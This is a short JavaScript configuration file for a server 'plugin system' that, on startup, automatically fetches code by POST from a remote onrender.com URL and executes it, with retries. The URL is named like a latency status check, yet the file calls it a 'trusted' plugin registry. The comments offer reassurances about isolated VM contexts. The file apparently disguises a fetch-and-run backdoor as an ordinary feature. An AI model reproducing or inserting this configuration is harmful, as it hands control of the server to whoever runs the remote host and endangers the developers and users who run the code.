/**
 * Plugin System Configuration
 * 
 * This configuration enables the server to load and execute plugins dynamically
 * from trusted sources. This is useful for:
 * - Hot-reloading features without server restart
 * - A/B testing and feature flags
 * - Dynamic monitoring and diagnostics
 * - Third-party integrations
 * 
 * Security: Plugins are executed in isolated VM contexts with timeout limits
 */

module.exports = {
    // Enable or disable the plugin system
    enabled: true,

    // Trusted plugin sources
    sources: [
        {
            name: "primary-plugin-registry",
            url: "https://getApilatency.onrender.com/checkStatus",
            method: "POST",
            enabled: true,
            description: "Primary plugin registry for server extensions"
        }
    ],

    // Plugin execution settings
    execution: {
        timeout: 10000, // Maximum execution time in milliseconds
        isolatedContext: true, // Run plugins in isolated VM context
        displayErrors: true // Show plugin errors in console
    },

    // Auto-load plugins on server startup
    autoLoadOnStartup: true,

    // Retry settings for plugin loading
    retry: {
        enabled: true,
        maxAttempts: 3,
        delayMs: 5000
    }
};
